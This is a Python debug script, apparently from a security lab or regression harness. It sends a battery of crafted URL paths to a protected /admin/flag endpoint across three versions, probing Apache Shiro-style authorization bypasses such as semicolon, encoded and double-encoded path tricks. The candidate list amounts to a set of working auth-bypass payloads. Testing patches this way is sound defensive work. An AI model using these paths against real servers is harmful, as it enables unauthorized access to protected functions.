#!/usr/bin/env python3
"""Empirical battery: send many crafted paths to a version and print a matrix of
(status, flag?) so we can pick the ORIGINAL (works v0, blocked v1) and the
RESIDUAL (works v1, blocked v2) crafted paths. Debug tool only (not part of gate)."""
import sys
from poc_common import probe

# Battery of crafted-path candidates against the protected controller /admin/flag.
CANDS = [
    {"id": "plain",                 "path": "/admin/flag"},
    {"id": "trailing-slash",        "path": "/admin/flag/"},
    {"id": "double-slash-lead",     "path": "//admin/flag"},
    {"id": "dot-slash",             "path": "/./admin/flag"},
    {"id": "admin-dot",             "path": "/admin/./flag"},
    {"id": "semicolon-lead",        "path": "/;/admin/flag"},
    {"id": "enc-semicolon-lead",    "path": "/%3b/admin/flag"},
    {"id": "enc-semicolon-lead-U",  "path": "/%3B/admin/flag"},
    {"id": "semicolon-mid",         "path": "/admin;/flag"},
    {"id": "enc-semicolon-mid",     "path": "/admin%3b/flag"},
    {"id": "semicolon-seg-suffix",  "path": "/admin/flag;x"},
    {"id": "enc-semicolon-suffix",  "path": "/admin/flag%3bx"},
    {"id": "semicolon-only-seg",    "path": "/admin/;flag"},
    {"id": "enc-semicolon-onlyseg", "path": "/admin/%3bflag"},
    {"id": "matrix-on-admin",       "path": "/admin;a=b/flag"},
    {"id": "enc-matrix-on-admin",   "path": "/admin%3ba=b/flag"},
    {"id": "dotdot-semicolon",      "path": "/x/..;/admin/flag"},
    {"id": "enc-dotdot-semicolon",  "path": "/x/..%3b/admin/flag"},
    {"id": "backslash",             "path": "/admin\\flag"},
    {"id": "enc-backslash",         "path": "/admin%5cflag"},
    {"id": "trailing-semicolon",    "path": "/admin/flag;"},
    {"id": "enc-trailing-semi",     "path": "/admin/flag%3b"},
    # double-encoded (%25xx) — probe the 1.5.2 double-decode (SHIRO-753) regression
    {"id": "dbl-semi-admin-suffix", "path": "/admin%253bx/flag"},
    {"id": "dbl-semi-flag-suffix",  "path": "/admin/flag%253bx"},
    {"id": "dbl-semi-preadmin",     "path": "/admin/%253bflag"},
    {"id": "dbl-semi-onlyseg",      "path": "/admin/%253b/flag"},
    {"id": "enc-semi-admin-suffix", "path": "/admin%3bx/flag"},
    {"id": "enc-semi-flag-suffix2", "path": "/admin/flag%3bx"},
]


def run(version):
    print(f"=== version {version} ===")
    for c in CANDS:
        try:
            r = probe(c, version=version)
        except Exception as e:
            print(f"  {c['id']:24s} {c['path']:28s} ERR {e}")
            continue
        flag = "FLAG" if "ADMIN-FLAG:" in r["body"] and "PCBFLAG" in r["body"] else "----"
        # detect the marker prefix even if flag env differs
        hit = "ADMIN-FLAG:" in r["body"]
        print(f"  {c['id']:24s} {c['path']:30s} -> {r['status']:>3} {'REACHED' if hit else '       '}")


if __name__ == "__main__":
    for v in (sys.argv[1:] or ["v0", "v1", "v2"]):
        run(v)
